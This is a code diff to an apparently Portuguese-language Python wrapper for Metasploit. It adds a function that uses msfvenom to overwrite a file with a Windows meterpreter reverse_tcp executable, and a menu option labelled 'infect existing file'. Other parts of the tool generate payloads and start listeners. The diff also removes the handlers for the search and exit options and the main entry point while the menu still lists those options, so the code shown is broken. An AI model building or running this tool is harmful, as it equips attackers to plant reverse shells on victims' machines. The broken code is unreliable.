@@ -13,6 +13,10 @@ def get_local_ip():
     except Exception:
         return "127.0.0.1"
 
+def is_file_in_msf4(file_path):
+    msf4_dir = os.path.expanduser("~/.msf4/modules/")
+    return file_path.startswith(msf4_dir)
+
 def list_msf4_modules():
     msf4_dir = os.path.expanduser("~/.msf4/modules/")
     if os.path.exists(msf4_dir):
@@ -80,6 +84,21 @@ def start_listener(lhost, lport):
     except Exception as e:
         print(f"Erro ao iniciar o listener: {str(e)}")
 
+def infect_existing_file(file_path, lhost, lport):
+    if not is_file_in_msf4(file_path):
+        print("O arquivo não está no repositório .msf4. Certifique-se de que o arquivo seja um módulo válido.")
+        return
+
+    print(f"Infectando o arquivo {file_path} com payload para {lhost}:{lport}...")
+    cmd = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", file_path]
+    print("Comando usado para infectar o arquivo:")
+    print(" ".join(cmd))
+    try:
+        subprocess.call(cmd)
+        print(f"Arquivo {file_path} infectado com sucesso.")
+    except Exception as e:
+        print(f"Erro ao infectar o arquivo: {str(e)}")
+
 def main():
     local_ip = get_local_ip()
     print(f"Seu endereço IP local é: {local_ip}")
@@ -90,9 +109,10 @@ def main():
         print("2. Iniciar listener")
         print("3. Listar módulos no .msf4")
         print("4. Pesquisar módulos no .msf4")
-        print("5. Sair")
+        print("5. Infectar arquivo existente")
+        print("6. Sair")
 
-        option = input("Escolha uma opção (1/2/3/4/5): ")
+        option = input("Escolha uma opção (1/2/3/4/5/6): ")
 
         if option == "1":
             payload_type = input("Escolha o tipo de payload (pdf/exe/apk): ")
@@ -105,17 +125,3 @@ def main():
             start_listener(lhost, lport)
         elif option == "3":
             module_list = list_msf4_modules()
-        elif option == "4":
-            if "module_list" in locals():
-                query = input("Digite o nome do módulo que deseja pesquisar: ")
-                search_modules(query, module_list)
-            else:
-                print("Primeiro liste os módulos no diretório .msf4 (opção 3).")
-        elif option == "5":
-            print("Encerrando o programa.")
-            break
-        else:
-            print("Opção inválida. Tente novamente.")
-
-if __name__ == "__main__":
-    main()
